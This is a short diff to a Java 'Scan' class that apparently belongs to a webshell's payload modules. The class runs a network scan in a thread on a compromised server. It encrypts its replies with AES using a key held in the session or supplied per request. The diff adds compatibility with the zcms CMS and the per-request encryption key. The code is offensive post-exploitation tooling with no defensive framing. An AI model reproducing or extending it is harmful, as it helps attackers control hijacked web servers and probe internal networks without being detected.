@@ -44,6 +44,10 @@ public class Scan implements Runnable
         this.Request = page.getRequest();
         page.getResponse().setCharacterEncoding("UTF-8");
         final Map<String, String> result = new HashMap<String, String>();
+        //兼容zcms
+        if(Session.getAttribute("payload")!=null){
+            Session.removeAttribute("payload");
+        }
         try {
             new Thread(new Scan(this.Session)).start();
             result.put("msg", "\u626b\u63cf\u4efb\u52a1\u63d0\u4ea4\u6210\u529f");
@@ -109,7 +113,8 @@ public class Scan implements Runnable
     }
     
     private byte[] Encrypt(final byte[] bs) throws Exception {
-        final String key = this.Session.getAttribute("u").toString();
+        final Object custmKeyObj = this.Request.getAttribute("parameters");
+        final String key = (custmKeyObj!=null&&custmKeyObj instanceof String) ? custmKeyObj.toString():this.Session.getAttribute("u").toString();
         final byte[] raw = key.getBytes("utf-8");
         final SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
         final Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
